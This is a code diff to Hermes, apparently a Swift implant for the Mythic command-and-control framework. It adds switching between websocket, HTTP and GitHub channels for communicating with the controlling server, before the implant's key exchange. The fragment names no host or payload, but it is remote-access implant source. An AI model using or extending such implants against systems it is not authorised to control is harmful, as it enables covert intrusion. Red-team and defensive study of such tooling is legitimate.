@@ -3,9 +3,36 @@
 //  Hermes
 //
 //  Created by slyd0g on 5/18/21.
+//  Updated to support multiple C2 profiles
 //
 
 import Foundation
+
+// Initialize the C2 profile manager based on configuration
+func initializeC2Profile() -> Bool {
+    let profileTypeString = agentConfig.c2ProfileType.lowercased()
+    let profileType: C2ProfileType
+    
+    switch profileTypeString {
+    case "websocket":
+        profileType = .websocket
+    case "http":
+        profileType = .http
+    case "github":
+        profileType = .github
+    default:
+        profileType = .http
+    }
+    
+    profileManager = C2ProfileManager(profileType: profileType)
+    return profileManager.initializeProfile()
+}
+
+// Initialize C2 profile
+if (!initializeC2Profile()) {
+    print("Failed to initialize C2 profile")
+    exit(0)
+}
 
 // Perform key exchange to grab new AES key from Mythic per implant
 if (!encryptedKeyExchange())
